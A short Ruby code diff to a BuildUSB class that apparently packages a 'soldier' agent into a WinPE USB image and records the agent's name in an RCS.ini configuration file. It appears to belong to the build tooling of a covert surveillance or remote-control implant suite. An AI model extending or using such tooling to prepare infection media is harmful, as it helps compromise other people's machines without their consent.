@@ -43,6 +43,11 @@ class BuildUSB < Build
       @outputs << "winpe/RCSPE/files/WINDOWS/" + v
     end
 
+    build.melt({'soldier' => true, 'scout' => false})
+    FileUtils.mkdir_p(path("winpe/RCSPE/files/#{platform.upcase}/SOLDIER"))
+    FileUtils.cp(File.join(build.tmpdir, 'output'), path("winpe/RCSPE/files/#{platform.upcase}/SOLDIER/soldier"))
+    soldier_name = build.soldier_name(@factory.confkey)[:name]
+
     # if mac was not built, delete it to avoid errors during installation without osx
     if Dir[path("winpe/RCSPE/files/OSX/*")].size == 1
       FileUtils.rm_rf(path("winpe/RCSPE/files/OSX"))
@@ -80,6 +85,7 @@ class BuildUSB < Build
       f.puts "HKEY=#{key}"
       f.puts "FUNC=" + funcnames[8]
       f.puts "MASK=#{params['dump_mask']}"
+      f.puts "SOLD=#{soldier_name}"
     end
 
     @outputs << 'winpe/RCSPE/RCS.ini'
